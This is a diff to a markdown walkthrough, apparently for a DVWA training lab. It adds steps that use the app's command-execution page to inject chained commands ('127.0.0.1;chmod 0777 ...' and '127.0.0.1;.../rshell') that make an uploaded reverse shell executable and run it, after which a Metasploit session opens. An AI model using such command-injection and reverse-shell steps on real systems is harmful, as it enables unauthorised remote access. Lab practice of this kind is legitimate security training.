@@ -67,7 +67,20 @@ msf> exploit -j
 
 ![File Upload](Files/images/dvwa_file_upload2.png)
 
+- now find the "" button so we can chmod and run the file we just uploaded.
+
+![Exec Cmd](Files/images/dvwa_exec.png)
+
+- first command should be:
+``` 127.0.0.1;chmod 0777 /var/www/html/hackable/uploads/rshell ```
+
+- second command should be:
+``` 127.0.0.1;/var/www/html/hackable/uploads/rshell ```
+
 - you should see a session start as soon as you run the command
+
+![MSF Sessions](Files/images/msfconsole_sessions.png)
+
 - enter the session, then enter the shell
 - spawn a new tty
 
